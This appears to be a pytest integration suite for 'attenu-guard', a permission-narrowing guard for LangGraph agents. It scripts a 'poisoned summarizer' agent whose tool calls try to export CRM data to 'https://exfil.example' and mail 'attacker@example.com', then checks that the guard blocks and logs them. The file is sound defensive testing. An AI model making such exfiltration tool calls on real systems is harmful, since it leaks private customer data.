"""attenu-guard × LangGraph 1.x — integration tests.

Runs the canonical "poisoned summarizer" scenario against a REAL, compiled
LangGraph graph, driven by a scripted offline chat model (no LLM API key, no
network). Three call paths are covered, because LangGraph 1.x has three:

  1. hand-written graph nodes      -> the SHIPPED adapter
                                      (`attenu_guard.adapters.langgraph`)
  2. `ToolNode(wrap_tool_call=…)`  -> the example adapter's tool gate, on a
                                      hand-rolled `StateGraph`
  3. `create_agent(middleware=…)`  -> the same gate, as LangChain middleware

Skips cleanly when langgraph isn't installed.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from typing import Annotated, Any, TypedDict

import pytest

pytest.importorskip("langgraph")
pytest.importorskip("langchain_core")

from langchain_core.language_models.chat_models import BaseChatModel  # noqa: E402
from langchain_core.messages import AIMessage, AnyMessage, ToolMessage  # noqa: E402
from langchain_core.outputs import ChatGeneration, ChatResult  # noqa: E402
from langchain_core.tools import tool  # noqa: E402
from langgraph.graph import END, START, StateGraph  # noqa: E402
from langgraph.graph.message import add_messages  # noqa: E402
from langgraph.prebuilt import ToolNode, tools_condition  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# --------------------------------------------------------------------------
# `GuardedDelegation`/`ToolPolicy` are SHIPPED library code from
# `attenu_guard.adapters.langchain` -- the shipped adapter that wires into
# LangGraph's own `ToolNode(wrap_tool_call=...)` and LangChain's
# `create_agent(middleware=...)` (call paths 2 and 3 above), NOT a paste-in
# example loaded by path. (Release-gate correction: this used to be aliased
# `dg_langgraph`, and imported as if it were `attenu_guard.adapters.langgraph`
# -- the SHIPPED, hand-written-node adapter path 1 above actually names. That
# mislabeling meant every `GuardedDelegation`-based test below — the large
# majority of this file — was, and still is, genuinely testing `adapters.
# langchain`, correctly; only the NAME was wrong. `adapters.langgraph` itself
# is tested directly in `test_shipped_adapter_guards_a_real_compiled_state
# graph` below (path 1) and in `tests/test_langgraph_adapter.py` (the
# zero-dependency unit suite, including its own execution-binding and
# snapshot-hardening coverage).
# --------------------------------------------------------------------------
import attenu_guard.adapters.langchain as dg_langchain
GuardedDelegation = dg_langchain.GuardedDelegation
ToolPolicy = dg_langchain.ToolPolicy


# --------------------------------------------------------------------------
# Offline model: scripted AIMessages with tool_calls. `bind_tools` is a no-op
# passthrough because the script already decides which tools get called.
# --------------------------------------------------------------------------
class ScriptedToolModel(BaseChatModel):
    """Replays a fixed list of AIMessages. No API key, no network."""

    responses: list
    i: int = 0

    def _generate(self, messages, stop=None, run_manager=None, **kwargs) -> ChatResult:
        message = self.responses[min(self.i, len(self.responses) - 1)]
        self.i += 1
        return ChatResult(generations=[ChatGeneration(message=message)])

    def bind_tools(self, tools, **kwargs):  # noqa: ANN001
        return self

    @property
    def _llm_type(self) -> str:
        return "scripted-tool-model"


def _call(name: str, args: dict, call_id: str) -> AIMessage:
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


# --------------------------------------------------------------------------
# The scenario's tools. Each records a side effect so a test can assert the
# BODY never ran, not merely that some error came back.
# --------------------------------------------------------------------------
@pytest.fixture
def side_effects() -> list:
    return []


def _make_tools(side_effects: list):
    @tool
    def crm_query(rows: int) -> str:
        """Read `rows` rows from the CRM."""
        side_effects.append(("crm_query", rows))
        return f"{rows} CRM rows"

    @tool
    def crm_export(destination: str) -> str:
        """Export the CRM to an external destination."""
        side_effects.append(("crm_export", destination))
        return f"exported to {destination}"

    @tool
    def send_mail(to: str) -> str:
        """Send mail."""
        side_effects.append(("send_mail", to))
        return f"mailed {to}"

    return crm_query, crm_export, send_mail


POLICIES = {
    "crm_query": ToolPolicy("crm.read", lambda args: {"rows": args.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", lambda args: {"egress": "any"}),
    "send_mail": ToolPolicy("mail.send", lambda args: {"egress": "any"}),
}

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)


def _fresh_chain():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    summarizer = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize Q3 pipeline")
    return root, summarizer


# ==========================================================================
# 1. The SHIPPED adapter, on a real StateGraph (previously only ever tested
#    against a fake graph object).
# ==========================================================================
def test_shipped_adapter_guards_a_real_compiled_stategraph(side_effects):
    from attenu_guard.adapters.langgraph import add_guarded_node, guard_node

    root, summarizer = _fresh_chain()

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]
        expected_rows: int
        note: str

    @guard_node(summarizer, "crm.read", context_fn=lambda state: {"rows": state["expected_rows"]})
    def summarize(state: S) -> dict:
        side_effects.append(("summarize_node", state["expected_rows"]))
        return {"note": "summarised"}

    def export_impl(state: S) -> dict:
        side_effects.append(("export_node", "https://exfil.example"))
        return {"note": "exported"}

    graph = StateGraph(S)
    graph.add_node("summarize", summarize)
    add_guarded_node(
        graph, "export", summarizer, "crm.export", export_impl,
        context_fn=lambda state: {"egress": "any"},
    )
    graph.add_edge(START, "summarize")
    graph.add_edge("summarize", "export")
    graph.add_edge("export", END)
    app = graph.compile()

    with pytest.raises(AuthorityDenied):
        app.invoke({"messages": [], "expected_rows": 4200, "note": ""})

    assert ("summarize_node", 4200) in side_effects
    assert not any(e[0] == "export_node" for e in side_effects)


# ==========================================================================
# 2. Raw StateGraph + ToolNode(wrap_tool_call=…) — the LangGraph-native tool
#    interception point.
# ==========================================================================
def _build_tool_graph(model, guarded, tools):
    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    def call_model(state: S) -> dict:
        return {"messages": [model.invoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(list(tools), wrap_tool_call=guarded.wrap_tool_call))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    return graph.compile()


def test_toolnode_blocks_export_before_the_tool_body_runs(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    # (a) the in-authority call ran
    assert ("crm_query", 4200) in side_effects
    # (b) the poisoned call NEVER reached the tool body
    assert not any(e[0] == "crm_export" for e in side_effects)

    denials = [m for m in out["messages"]
               if isinstance(m, ToolMessage) and m.status == "error"]
    assert len(denials) == 1
    assert "scope_not_granted" in denials[0].content


def test_row_ceiling_denies_an_oversized_read(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 90_000}, "c1"),   # under root's 100k, over the child's 5k
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "dump everything")]})

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "ceiling_exceeded" in denial.content


def test_unlisted_tool_fails_closed(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    # send_mail deliberately absent from the policy map
    guarded = GuardedDelegation(summarizer, tools={
        "crm_query": POLICIES["crm_query"], "crm_export": POLICIES["crm_export"],
    })

    model = ScriptedToolModel(responses=[
        _call("send_mail", {"to": "attacker@example.com"}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "mail it out")]})

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "no attenu-guard policy" in denial.content


def test_denials_carry_disposition_on_the_ledger_held_vs_unresolved(side_effects):
    """Slice 1 / Plan A: a held tool says held_pending_grant; an unlisted tool lands on the ledger as unresolved."""
    from attenu_guard import Disposition
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools={
        "crm_query": POLICIES["crm_query"],
        "crm_export": ToolPolicy("crm.export", lambda args: {"egress": "any"}, disposition=Disposition.HELD_PENDING_GRANT),
        # send_mail deliberately absent
    })
    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "x"}, "c1"),
        _call("send_mail", {"to": "attacker@example.com"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})
    assert side_effects == []
    led = {e["tool"]: e for e in root.audit_log().entries if e["event"] == "deny"}
    assert led["crm_export"]["disposition"] == "held_pending_grant"
    assert led["send_mail"]["disposition"] == "unresolved" and led["send_mail"]["reason"] == "no_authority"


def test_deny_mode_raise_aborts_the_graph(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, on_deny="raise")

    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])

    with pytest.raises(AuthorityDenied):
        app.invoke({"messages": [("user", "exfiltrate")]})
    assert side_effects == []


def test_revocation_cascades_to_a_running_graph(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    def run():
        model = ScriptedToolModel(responses=[
            _call("crm_query", {"rows": 100}, "c1"),
            AIMessage(content="done"),
        ])
        app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
        return app.invoke({"messages": [("user", "read a little")]})

    run()
    assert ("crm_query", 100) in side_effects

    root.revoke(summarizer.node_id)          # cascade from the parent
    side_effects.clear()
    out = run()

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "revoked" in denial.content


# ==========================================================================
# 3. LangChain `create_agent` + middleware — the officially blessed hook in
#    the LangChain 1.x / LangGraph 1.x agent stack.
# ==========================================================================
def test_create_agent_middleware_blocks_export_before_the_body(side_effects):
    pytest.importorskip("langchain")
    from langchain.agents import create_agent

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    agent = create_agent(
        model,
        tools=[crm_query, crm_export, send_mail],
        middleware=[guarded.middleware()],
    )
    out = agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)
    assert any(isinstance(m, ToolMessage) and m.status == "error" for m in out["messages"])


# ==========================================================================
# 4. Structural guarantees + audit trail.
# ==========================================================================
def test_child_is_provably_narrower_and_cannot_be_widened():
    root, summarizer = _fresh_chain()
    assert summarizer.authority.is_narrower_than(root.authority)
    assert not root.authority.is_narrower_than(summarizer.authority)

    greedy = summarizer.delegate(
        "greedy",
        Authority(scopes={"crm.*", "mail.send", "admin.*"},
                  ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=99_999),
        task="please give me everything",
    )
    # The request asked for MORE than the parent holds; it was met down.
    assert greedy.authority.is_narrower_than(summarizer.authority)
    assert greedy.authority.scopes == frozenset({"crm.read"})
    assert greedy.authority.ceiling("max_rows").max_rows == 5_000
    assert greedy.authority.ceiling("egress").level == "none"
    assert greedy.authority.ttl == 900
    assert not greedy.check("mail.send")
    assert not greedy.check("admin.reset")


def test_audit_log_verifies_and_records_the_denial(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err

    denies = [e for e in entries if e["event"] == "deny"]
    assert len(denies) == 1
    assert denies[0]["tool"] == "crm_export"
    assert denies[0]["scope"] == "crm.export"
    assert denies[0]["reason"] == "scope_not_granted"
    assert denies[0]["node"] == summarizer.node_id

    allows = [e for e in entries if e["event"] == "allow"]
    assert [a["tool"] for a in allows] == ["crm_query"]
    assert any(e["event"] == "spawn" for e in entries)


# ==========================================================================
# 5. The async path (`ainvoke`) — same gate via `awrap_tool_call`.
#    Uses asyncio.run() rather than pytest-asyncio so the suite needs no
#    extra plugin.
# ==========================================================================
def test_async_toolnode_blocks_export_before_the_tool_body(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])

    async def call_model(state: S) -> dict:
        return {"messages": [await model.ainvoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(
        [crm_query, crm_export, send_mail],
        wrap_tool_call=guarded.wrap_tool_call,
        awrap_tool_call=guarded.awrap_tool_call,
    ))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    app = graph.compile()

    out = asyncio.run(app.ainvoke({"messages": [("user", "summarize Q3 pipeline")]}))

    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "scope_not_granted" in denial.content


# ==========================================================================
# 5. Observe mode for SAMPLING (attenu-derive P1): unlisted tools and undeclared
#    sub-agents get a GENERATED policy/authority so every call is authorized-and-
#    RECORDED through the guard instead of denied (fail-closed default) or silently
#    passed through (`allow_unlisted=True`). Deny stays the default when neither
#    hook is given.
# ==========================================================================
def test_default_policy_records_unlisted_tools_instead_of_denying(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    seen = []
    def observe(name):
        seen.append(name)
        return ToolPolicy(f"observe.{name}", lambda args: {"arg_keys": sorted(args)})
    guarded = GuardedDelegation(root, tools={}, default_policy=observe)

    model = ScriptedToolModel(responses=[
        _call("send_mail", {"to": "x@example.com"}, "c1"),
        _call("crm_query", {"rows": 7}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert side_effects == [("send_mail", "x@example.com"), ("crm_query", 7)]   # ran (allowed)
    assert seen == ["send_mail", "crm_query"]                                    # generated per tool
    allows = [e for e in root.audit_log() if e["event"] == "allow"]
    assert [(e["tool"], e["scope"], e["context"]) for e in allows] == [
        ("send_mail", "observe.send_mail", {"arg_keys": ["to"]}),
        ("crm_query", "observe.crm_query", {"arg_keys": ["rows"]}),
    ]                                                                            # RECORDED, with the policy's context
    ok, _ = AuditLog.verify(root.audit_log().entries)
    assert ok


def test_default_subagent_authority_mints_children_for_undeclared_subagents(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    guarded = GuardedDelegation(
        root, tools={}, subagents={},
        default_policy=lambda name: ToolPolicy(f"observe.{name}"),
        default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None),
    )
    # A `task` call for a sub-agent nobody declared: observe mode delegates anyway.
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher",
                                                                "description": "look things up"}})
    gate = guarded._gate(req, capture=dg_langchain.Capture.WRAPPER_SYNC)
    assert gate.denial is None and gate.child is not None
    assert gate.child.agent_id == "researcher" and gate.child.is_narrower_than(root)
    spawn = [e for e in root.audit_log() if e["event"] == "spawn"][-1]
    assert spawn["agent"] == "researcher" and spawn["task"] == "look things up"


def test_without_the_hooks_unlisted_still_fails_closed(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools={})
    model = ScriptedToolModel(responses=[_call("send_mail", {"to": "a@b"}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})
    assert side_effects == []


def test_delegation_lifecycle_end_is_recorded_when_the_task_tool_returns(side_effects):
    """`done` on the ledger when the delegation tool's handler returns (per-node truncation accounting downstream)."""
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    guarded = GuardedDelegation(root, tools={}, subagents={},
                                default_policy=lambda name: ToolPolicy(f"observe.{name}"),
                                default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None))
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher", "description": "look things up"}})
    out = guarded.wrap_tool_call(req, lambda r: "child ran")
    assert out == "child ran"
    child = guarded.children["researcher"]
    assert child.is_complete
    dones = [e for e in root.audit_log() if e["event"] == "done"]
    assert len(dones) == 1 and dones[0]["agent"] == "researcher" and dones[0]["node"] == child.node_id


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# GuardedDelegation calls the tool body itself (handler(request)), exactly
# like adapters/langgraph.py's reference wiring, so WRAPPER_SYNC/WRAPPER_ASYNC
# is a genuine observation -- no cross-hook honesty caveat is needed.
# ==========================================================================
def _fresh_chain_v2():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    summarizer = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize Q3 pipeline")
    return root, summarizer


def test_v2_allowed_call_records_a_returned_outcome(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 10}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_SYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.langchain"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_v2_async_allowed_call_records_a_returned_outcome_wrapper_async(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 10}, "c1"),
        AIMessage(content="done"),
    ])

    async def call_model(state: S) -> dict:
        return {"messages": [await model.ainvoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(
        [crm_query, crm_export, send_mail],
        wrap_tool_call=guarded.wrap_tool_call,
        awrap_tool_call=guarded.awrap_tool_call,
    ))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    app = graph.compile()

    asyncio.run(app.ainvoke({"messages": [("user", "go")]}))

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED


def test_v2_a_tool_that_raises_records_a_raised_outcome(side_effects):
    root, summarizer = _fresh_chain_v2()

    @tool
    def crm_query(rows: int) -> str:
        """Raises instead of returning."""
        raise ValueError("boom")

    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query])
    with pytest.raises(ValueError):
        app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
        AIMessage(content="x"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert side_effects == []
    entries = list(root.audit_log())
    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome(side_effects):
    """schema_version=1 (the default): byte-and-type identical to every release before 0.9.0."""
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()   # v1, unchanged default
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_delegation_call_never_gets_capture_or_an_outcome(side_effects):
    """The `task` tool mints via guard.delegate(), never calls guard.check() -- there is no
    Decision/call_id for it to bind an outcome to, on any schema version."""
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample", schema_version=2)
    guarded = GuardedDelegation(root, tools={}, subagents={},
                                default_policy=lambda name: ToolPolicy(f"observe.{name}"),
                                default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None))
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher", "description": "x"}})
    out = guarded.wrap_tool_call(req, lambda r: "child ran")
    assert out == "child ran"
    entries = list(root.audit_log())
    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_v2_async_cancelled_call_records_abandoned_and_still_propagates(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)

    async def hangs(request):
        await asyncio.sleep(3600)

    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})

    async def scenario():
        task = asyncio.ensure_future(guarded.awrap_tool_call(req, hangs))
        await asyncio.sleep(0)   # let it reach the awaited sleep
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    entries = list(root.audit_log())
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"x": AliasingList([1])}
    snapshot = dg_langchain._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


def test_v2_complete_finalizes_and_verifier_reports_the_tool_call_observed():
    """After a real graph run, the summarizer's own Guard must be able to complete() -- proving
    every allowed, v2, WRAPPER-captured call genuinely got its outcome bound, not merely that
    the graph didn't crash."""
    crm_query, crm_export, send_mail = _make_tools([])
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert summarizer.complete()


# ==========================================================================
# Codex review round 2 (batch 2, finding 1): `handler` is only genuinely the
# raw tool body when this adapter is the ONLY wrap_tool_call-implementing
# middleware in a create_agent(middleware=[...]) list -- LangChain composes
# every registered wrap_tool_call into ONE chain
# (langchain.agents.factory._chain_tool_call_wrappers, "first = outermost"),
# and ships middleware (tool_retry, tool_emulator) explicitly designed to
# skip or repeat the inner handler. DEFAULT mode must never fabricate an
# outcome regardless of what a sibling does, in EITHER list order.
# ==========================================================================
def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome(side_effects):
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and no outcome is ever recorded -- not merely "no outcome happens
    to be missing", but zero outcome events at all, and the body still genuinely runs (this is
    authorization-only, not a broken integration)."""
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)   # strict_single_hook defaults False

    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert ("crm_query", 10) in side_effects
    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert "call_id" in allow  # still a genuine v2 chain -- just no outcome recorded against it
    assert [e for e in entries if e["event"] == "outcome"] == []
    assert summarizer.complete()


def _composed_wrapper(order):
    """Compose `guarded.wrap_tool_call` with a sibling that never calls its own `execute` --
    using LangChain's OWN chaining function, not a hand-rolled stand-in, so the test exercises
    the real composition mechanism `create_agent(middleware=[...])` uses."""
    from langchain.agents.factory import _chain_tool_call_wrappers

    root, summarizer = _fresh_chain_v2()
    calls: list = []

    def short_circuiting_sibling(request, execute):
        # Never calls execute() -- e.g. a cache/emulator middleware answering from a mock.
        return ToolMessage(content="mocked", tool_call_id=request.tool_call["id"])

    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    wrappers = (
        [guarded.wrap_tool_call, short_circuiting_sibling] if order == "guard_first"
        else [short_circuiting_sibling, guarded.wrap_tool_call]
    )
    composed = _chain_tool_call_wrappers(wrappers)

    def real_execute(req):
        calls.append(req.tool_call["args"])
        return ToolMessage(content="real", tool_call_id=req.tool_call["id"])

    from types import SimpleNamespace
    request = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})
    result = composed(request, real_execute)
    return root, summarizer, calls, result


@pytest.mark.parametrize("order", ["guard_first", "sibling_first"])
def test_v2_strict_mode_never_records_a_false_outcome_when_a_sibling_short_circuits(order):
    """Codex review round 2, finding 1: with strict_single_hook=True attested (this adapter is
    the ONLY wrap_tool_call middleware it knows about) but a caller nonetheless composes a
    SIBLING that never reaches the real body, this adapter must not be caught fabricating a
    RETURNED outcome for a call whose real body never ran. Both orders: when this adapter is
    OUTER (calls the sibling as its own `handler`) and when it is INNER (the sibling calls it)."""
    root, summarizer, calls, result = _composed_wrapper(order)

    if order == "guard_first":
        # guarded is OUTER: its own handler() call reaches the sibling, which never calls
        # real_execute -- so from guarded's perspective handler() "returned" the sibling's
        # mocked ToolMessage. The real body never ran.
        assert calls == [], "the real body must not have run in this repro"
        entries = root.audit_log().entries
        outcomes = [e for e in entries if e["event"] == "outcome"]
        # This is the documented residual of strict mode under a violated attestation: guarded
        # cannot tell the sibling's mocked ToolMessage apart from a genuine return, so it DOES
        # record RETURNED here -- exactly what the module docstring warns strict mode cannot
